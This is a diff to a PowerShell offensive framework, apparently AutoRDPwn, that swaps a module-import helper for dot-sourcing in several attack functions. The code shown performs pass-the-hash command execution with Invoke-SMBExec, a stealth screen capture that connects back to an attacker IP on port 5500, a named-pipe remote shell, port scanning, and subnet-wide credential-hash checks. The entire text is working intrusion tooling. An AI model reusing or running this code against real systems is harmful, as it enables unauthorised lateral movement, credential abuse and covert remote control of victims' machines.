@@ -984,12 +984,6 @@ function Get-ARResourcePath {
     return $localPath
 }
 
-function Import-ARFunctionScript {
-    param([Parameter(Mandatory = $true)][string]$RelativePath)
-    $path = Get-ARResourcePath $RelativePath
-    Import-Module -Name $path -Force -DisableNameChecking -ErrorAction Stop
-}
-
 function Import-ARToolScript {
     param([Parameter(Mandatory = $true)][string]$RelativePath)
     $path = Get-ARResourcePath $RelativePath
@@ -1631,7 +1625,7 @@ function Invoke-ARAttackPassTheHash {
     $user = [string]$script:ARTarget['User']
     $hash = [string]$script:ARTarget['Hash']
     $domain = [string]$script:ARTarget['Domain']
-    Import-ARFunctionScript 'Resources\Scripts\Invoke-SMBExec.ps1'
+    . (Get-ARResourcePath 'Resources\Scripts\Invoke-SMBExec.ps1')
     foreach ($payload in @(Get-ARPayloads)) {
         $command = Get-ARAttackPayloadCommand $payload
         Invoke-SMBExec -Target $target -Domain $domain -Username $user -Hash $hash -Command $command 2>&1 | ForEach-Object { Write-Host $_ }
@@ -1774,7 +1768,7 @@ function Invoke-ARAttackQuickScreen {
     $viewOnly = ([string]$script:ARTarget['Mode'] -eq 'view')
     $null = Get-ARResourcePath 'Resources\Scripts\Invoke-VNCViewer.ps1'
     $null = Get-ARResourcePath 'Resources\Scripts\Invoke-VNCServer.ps1'
-    Import-ARFunctionScript 'Resources\Scripts\Invoke-StealthScreen.ps1'
+    . (Get-ARResourcePath 'Resources\Scripts\Invoke-StealthScreen.ps1')
     Invoke-StealthScreen -Target $target -User ([string]$script:ARTarget['User']) -Pass $password -Mode view -AttackerIP $attacker -Port 5500 -ViewOnly:$viewOnly
     Set-ARStatus 'Quick Screen finished' 'Ok'
 }
@@ -1804,7 +1798,7 @@ function Invoke-ARModulePipeShell {
             } -ArgumentList $path | Out-Null
         } -ErrorAction Stop | Out-Null
     }
-    Import-ARFunctionScript 'Resources\Scripts\Invoke-PipeShell.ps1'
+    . (Get-ARResourcePath 'Resources\Scripts\Invoke-PipeShell.ps1')
     Write-ARInfo 'Named pipe server started on the target.'
     Invoke-PipeShell -mode client -server $target -aeskey AutoRDPwn_AESKey -i -pipe 'NamedPipeStream' -timeout 120
     Set-ARStatus 'Named pipe shell closed' 'Ok'
@@ -1996,7 +1990,7 @@ function Invoke-ARModulePortScan {
     $oldProgress = $ProgressPreference
     $ProgressPreference = 'Continue'
     try {
-        Import-ARFunctionScript 'Resources\Scripts\Invoke-Portscan.ps1'
+        . (Get-ARResourcePath 'Resources\Scripts\Invoke-Portscan.ps1')
         Invoke-Portscan -Hosts $range -Threads $threads -TopPorts $ports
     }
     finally { $ProgressPreference = $oldProgress }
@@ -2100,14 +2094,14 @@ function Invoke-ARModuleCredScan {
     $method = $method.ToLowerInvariant()
     if ($method -like 'pass*' -or $method -like 'contra*') {
         $plain = Read-ARSecret 'Password'
-        Import-ARFunctionScript 'Resources\Scripts\Get-NTLM.ps1'
+        . (Get-ARResourcePath 'Resources\Scripts\Get-NTLM.ps1')
         $hash = Get-NTLM $plain
     }
     else {
         $hash = Read-ARValue (Get-ARText 'txt84' 'Enter the NTLM Hash')
     }
     $protocol = Read-ARValue (Get-ARText 'txt85' 'Enter the protocol you want to use (SMB / WMI)') 'SMB'
-    Import-ARFunctionScript 'Resources\Scripts\Check-LocalAdminHash.ps1'
+    . (Get-ARResourcePath 'Resources\Scripts\Check-LocalAdminHash.ps1')
     Check-LocalAdminHash -Username $user -PasswordHash $hash -CIDR $range -Protocol $protocol -Threads 20
     Set-ARStatus 'Credential scan finished' 'Ok'
 }
